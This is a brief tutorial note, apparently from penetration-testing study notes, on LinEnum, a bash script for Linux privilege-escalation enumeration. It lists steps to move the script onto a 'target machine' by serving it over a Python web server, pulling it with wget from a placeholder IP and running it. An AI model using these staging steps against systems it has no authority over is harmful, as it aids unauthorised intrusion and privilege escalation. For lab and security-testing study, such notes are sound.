#### [Documentation](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)

# LinEnum

LinEnum is a bash script that performs common Linux privilege escalation commands. Run cmd `./LinEnum.sh`

**How to get LinEnum on a target machine:**
- **Method 1:** Create a python webserver to transfer the file.
	1) `cd` into the directory that holds LinEnum.sh
	2) Start a Python web server: `python3 -m http.server 8000`
	3) Transfer the file: `wget <IP>:<PORT>/<Directory>`
	4) Make the file executable using the command: `chmod +x LinEnum.sh`
- **Method 2:** copy and paste the code from your machine to a new file on the target machine. Then make it executable using `chmod +x LinEnum.sh`
